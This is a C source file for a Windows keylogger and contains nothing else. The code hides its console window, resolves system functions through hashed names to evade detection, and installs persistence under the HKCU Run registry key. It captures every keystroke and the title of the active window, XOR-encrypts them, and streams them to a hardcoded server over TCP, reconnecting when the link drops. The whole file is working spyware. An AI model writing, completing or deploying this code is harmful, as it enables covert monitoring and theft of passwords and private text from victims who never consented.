#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define SERVER_IP "192.168.1.64"
#define SERVER_PORT 8080
#define RECONNECT_DELAY 10000
#define SERVICE_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"
#define MAX_BUFFER 1024

// API Hashing Constants
#define HASH_SEED 0xDEADBEEF
#define HASH_API(name) (hash_string(name, HASH_SEED))

// Rotating XOR encryption
void xor_encrypt(char *data, size_t len) {
    const char *key = ENCRYPTION_KEY;
    size_t key_len = strlen(key);
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Simple string hashing function for API resolution
DWORD hash_string(const char *string, DWORD seed) {
    DWORD hash = seed;
    while (*string) {
        hash = ((hash << 5) + hash) + *string++;
    }
    return hash;
}

// Dynamically resolve API using hash
FARPROC resolve_api(HMODULE module, DWORD hash) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)module + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + 
        nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)module + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)module + export_dir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)module + export_dir->AddressOfFunctions);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (hash_string(name, HASH_SEED) == hash) {
            return (FARPROC)((BYTE*)module + functions[ordinals[i]]);
        }
    }
    return NULL;
}

// Hide console window using dynamic resolution
void hide_console_window() {
    HMODULE user32 = LoadLibraryA("user32.dll");
    if (user32) {
        typedef BOOL (__stdcall *ShowWindowFunc)(HWND, int);
        typedef HWND (__stdcall *GetConsoleWindowFunc)();
        
        ShowWindowFunc pShowWindow = (ShowWindowFunc)resolve_api(user32, HASH_API("ShowWindow"));
        GetConsoleWindowFunc pGetConsoleWindow = (GetConsoleWindowFunc)resolve_api(GetModuleHandleA("kernel32.dll"), 
            HASH_API("GetConsoleWindow"));
        
        if (pShowWindow && pGetConsoleWindow) {
            HWND hwnd = pGetConsoleWindow();
            if (hwnd) {
                pShowWindow(hwnd, SW_HIDE);
            }
        }
        FreeLibrary(user32);
    }
}

SOCKET connect_to_server() {
    HMODULE ws2_32 = LoadLibraryA("ws2_32.dll");
    if (!ws2_32) return INVALID_SOCKET;

    typedef int (__stdcall *WSAStartupFunc)(WORD, LPWSADATA);
    typedef int (__stdcall *WSACleanupFunc)();
    typedef SOCKET (__stdcall *SocketFunc)(int, int, int);
    typedef int (__stdcall *ConnectFunc)(SOCKET, const struct sockaddr*, int);
    typedef int (__stdcall *CloseSocketFunc)(SOCKET);
    typedef unsigned long (__stdcall *InetAddrFunc)(const char*);
    typedef u_short (__stdcall *HtonsFunc)(u_short);

    WSAStartupFunc pWSAStartup = (WSAStartupFunc)resolve_api(ws2_32, HASH_API("WSAStartup"));
    WSACleanupFunc pWSACleanup = (WSACleanupFunc)resolve_api(ws2_32, HASH_API("WSACleanup"));
    SocketFunc pSocket = (SocketFunc)resolve_api(ws2_32, HASH_API("socket"));
    ConnectFunc pConnect = (ConnectFunc)resolve_api(ws2_32, HASH_API("connect"));
    CloseSocketFunc pClosesocket = (CloseSocketFunc)resolve_api(ws2_32, HASH_API("closesocket"));
    InetAddrFunc pInet_addr = (InetAddrFunc)resolve_api(ws2_32, HASH_API("inet_addr"));
    HtonsFunc pHtons = (HtonsFunc)resolve_api(ws2_32, HASH_API("htons"));

    if (!pWSAStartup || !pWSACleanup || !pSocket || !pConnect || !pClosesocket || !pInet_addr || !pHtons) {
        FreeLibrary(ws2_32);
        return INVALID_SOCKET;
    }

    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    if (pWSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        FreeLibrary(ws2_32);
        return INVALID_SOCKET;
    }

    sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        pWSACleanup();
        FreeLibrary(ws2_32);
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = pHtons(SERVER_PORT);
    server.sin_addr.s_addr = pInet_addr(SERVER_IP);

    if (pConnect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        pClosesocket(sock);
        pWSACleanup();
        FreeLibrary(ws2_32);
        return INVALID_SOCKET;
    }

    FreeLibrary(ws2_32);
    return sock;
}

void send_window_title(SOCKET sock) {
    HMODULE user32 = LoadLibraryA("user32.dll");
    if (!user32) return;

    typedef HWND (__stdcall *GetForegroundWindowFunc)();
    typedef int (__stdcall *GetWindowTextAFunc)(HWND, LPSTR, int);
    
    GetForegroundWindowFunc pGetForegroundWindow = (GetForegroundWindowFunc)resolve_api(user32, HASH_API("GetForegroundWindow"));
    GetWindowTextAFunc pGetWindowTextA = (GetWindowTextAFunc)resolve_api(user32, HASH_API("GetWindowTextA"));
    
    if (!pGetForegroundWindow || !pGetWindowTextA) {
        FreeLibrary(user32);
        return;
    }

    char title[256];
    HWND foreground = pGetForegroundWindow();

    if (foreground) {
        pGetWindowTextA(foreground, title, sizeof(title));

        static char last_title[256] = "";
        if (strcmp(last_title, title) != 0) {
            char buffer[512];
            sprintf(buffer, "\n[Window: %s]\n", title);
            
            xor_encrypt(buffer, strlen(buffer));
            
            HMODULE ws2_32 = LoadLibraryA("ws2_32.dll");
            if (ws2_32) {
                typedef int (__stdcall *SendFunc)(SOCKET, const char*, int, int);
                SendFunc pSend = (SendFunc)resolve_api(ws2_32, HASH_API("send"));
                if (pSend) {
                    pSend(sock, buffer, strlen(buffer), 0);
                }
                FreeLibrary(ws2_32);
            }
            
            strcpy(last_title, title);
        }
    }
    FreeLibrary(user32);
}

void install_persistence() {
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE advapi32 = LoadLibraryA("advapi32.dll");
    if (!kernel32 || !advapi32) return;

    typedef DWORD (__stdcall *GetModuleFileNameAFunc)(HMODULE, LPSTR, DWORD);
    typedef LONG (__stdcall *RegOpenKeyExAFunc)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LONG (__stdcall *RegSetValueExAFunc)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LONG (__stdcall *RegCloseKeyFunc)(HKEY);

    GetModuleFileNameAFunc pGetModuleFileNameA = (GetModuleFileNameAFunc)resolve_api(kernel32, HASH_API("GetModuleFileNameA"));
    RegOpenKeyExAFunc pRegOpenKeyExA = (RegOpenKeyExAFunc)resolve_api(advapi32, HASH_API("RegOpenKeyExA"));
    RegSetValueExAFunc pRegSetValueExA = (RegSetValueExAFunc)resolve_api(advapi32, HASH_API("RegSetValueExA"));
    RegCloseKeyFunc pRegCloseKey = (RegCloseKeyFunc)resolve_api(advapi32, HASH_API("RegCloseKey"));

    if (!pGetModuleFileNameA || !pRegOpenKeyExA || !pRegSetValueExA || !pRegCloseKey) {
        FreeLibrary(advapi32);
        return;
    }

    char path[MAX_PATH];
    pGetModuleFileNameA(NULL, path, MAX_PATH);

    // Registry persistence
    HKEY hKey;
    if (pRegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        pRegSetValueExA(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
        pRegCloseKey(hKey);
    }

    FreeLibrary(advapi32);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window
    hide_console_window();
    
    // Set process priority
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (kernel32) {
        typedef BOOL (__stdcall *SetPriorityClassFunc)(HANDLE, DWORD);
        SetPriorityClassFunc pSetPriorityClass = (SetPriorityClassFunc)resolve_api(kernel32, HASH_API("SetPriorityClass"));
        if (pSetPriorityClass) {
            pSetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
        }
    }
    
    // Install persistence
    install_persistence();

    SOCKET sock;
    static bool key_states[256] = {0};

    while (1) {
        sock = connect_to_server();
        
        if (sock != INVALID_SOCKET) {
            HMODULE user32 = LoadLibraryA("user32.dll");
            HMODULE ws2_32 = LoadLibraryA("ws2_32.dll");
            
            if (user32 && ws2_32) {
                typedef SHORT (__stdcall *GetAsyncKeyStateFunc)(int);
                typedef int (__stdcall *SendFunc)(SOCKET, const char*, int, int);
                typedef void (__stdcall *SleepFunc)(DWORD);
                
                GetAsyncKeyStateFunc pGetAsyncKeyState = (GetAsyncKeyStateFunc)resolve_api(user32, HASH_API("GetAsyncKeyState"));
                SendFunc pSend = (SendFunc)resolve_api(ws2_32, HASH_API("send"));
                SleepFunc pSleep = (SleepFunc)resolve_api(kernel32, HASH_API("Sleep"));
                
                if (pGetAsyncKeyState && pSend && pSleep) {
                    while (1) {
                        send_window_title(sock);

                        for (int key = 8; key <= 190; key++) {
                            if ((pGetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                                char key_str[20] = {0};
                                                                         
                                if (key >= 65 && key <= 90) {
                                    sprintf(key_str, "%c", key + 32);
                                } else if (key >= 48 && key <= 57) {
                                    sprintf(key_str, "%c", key);
                                } else {
                                    switch (key) {
                                        case VK_SPACE: strcpy(key_str, " "); break;
                                        case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                                        case VK_TAB: strcpy(key_str, "[TAB]"); break;
                                        case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                                        case VK_BACK: strcpy(key_str, "\b"); break;
                                        case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                                        case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                                        case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                                        case VK_MENU: strcpy(key_str, "[ALT]"); break;
                                        case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                                        case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                                        case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                                        case VK_HOME: strcpy(key_str, "[HOME]"); break;
                                        case VK_END: strcpy(key_str, "[END]"); break;
                                        case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                                        case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                                        case VK_UP: strcpy(key_str, "[UP]"); break;
                                        case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                                        case VK_OEM_1: strcpy(key_str, ";"); break;
                                        case VK_OEM_7: strcpy(key_str, "'"); break;
                                        case VK_OEM_COMMA: strcpy(key_str, ","); break;
                                        case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                                        case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                                        case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                                        case VK_OEM_2: strcpy(key_str, "/"); break;
                                        case VK_OEM_3: strcpy(key_str, "`"); break;
                                        case VK_OEM_4: strcpy(key_str, "["); break;
                                        case VK_OEM_5: strcpy(key_str, "\\"); break;
                                        case VK_OEM_6: strcpy(key_str, "]"); break;
                                        default: continue;
                                    }
                                }

                                xor_encrypt(key_str, strlen(key_str));
                                if (pSend(sock, key_str, strlen(key_str), 0) == SOCKET_ERROR) {
                                    closesocket(sock);
                                    WSACleanup();
                                    sock = INVALID_SOCKET;
                                    break;
                                }

                                key_states[key] = true;
                            }
                            if (!(pGetAsyncKeyState(key) & 0x8000)) {
                                key_states[key] = false;
                            }
                        }
                        
                        if (sock == INVALID_SOCKET) {
                            break;
                        }
                        
                        pSleep(10);
                    }
                }
                FreeLibrary(user32);
                FreeLibrary(ws2_32);
            }
        }

        Sleep(RECONNECT_DELAY);
    }

    return 0;
} 